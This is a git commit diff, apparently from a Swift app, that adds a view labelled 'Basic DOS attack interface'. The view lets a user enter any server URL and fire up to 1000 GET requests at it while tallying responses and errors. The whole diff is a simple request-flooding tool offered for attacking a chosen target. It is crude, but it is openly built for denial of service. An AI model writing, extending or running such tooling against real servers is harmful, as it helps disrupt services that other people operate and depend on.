67f0612fd96b355720ea0eea073a4f1092da0cf4
pwablito <pwablito@gmail.com>
2021-06-16 16:24:21 -0600

    Basic DOS attack interface

--- Shared/DOSView.swift
+++ Shared/DOSView.swift
@@ -9,7 +9,63 @@ import Foundation
 import SwiftUI
 
 struct DOSView: View {
+    @State var server_url = "https://test.com"
+    @State var status_text = ""
+    @State private var num_requests = 1
+    @State private var requests_made = 0
+    @State private var num_responses = 0
+    @State private var num_errors = 0
+    
+    func make_requests() {
+        num_responses = 0
+        requests_made = 0
+        num_errors = 0
+        while requests_made != num_requests {
+            requests_made += 1
+            make_request()
+        }
+    }
+    
+    func make_request() {
+        let url = URL(string: server_url)!
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        
+        let session = URLSession.shared
+        let task = session.dataTask(with: request) { (data, response, error) in
+            if let error = error {
+                status_text = "Something went wrong: \(error.localizedDescription)"
+                num_errors += 1
+            } else if data == nil {
+                status_text = "Something unexpected happened"
+                num_errors += 1
+            }
+            num_responses += 1
+        }
+        task.resume()
+    }
+    
     var body: some View {
-        Text("This is the DOS view")
+        VStack {
+            TextField("Enter url", text: $server_url)
+            .padding()
+            HStack {
+                Picker("Number of requests to make", selection: $num_requests) {
+                    ForEach(1...1000, id:\.self) {
+                        Text("\($0)")
+                    }
+                }
+                Button {
+                    make_requests()
+                } label: {
+                    Text("Start")
+                }
+                .buttonStyle(DefaultButtonStyle())
+            
+            }.padding()
+            Text("Status:\n\(status_text)")
+            Text("Responses received: \(num_responses)/\(requests_made)")
+            Text("Error responses: \(num_errors)/\(num_responses)")
+        }.padding()
     }
 }
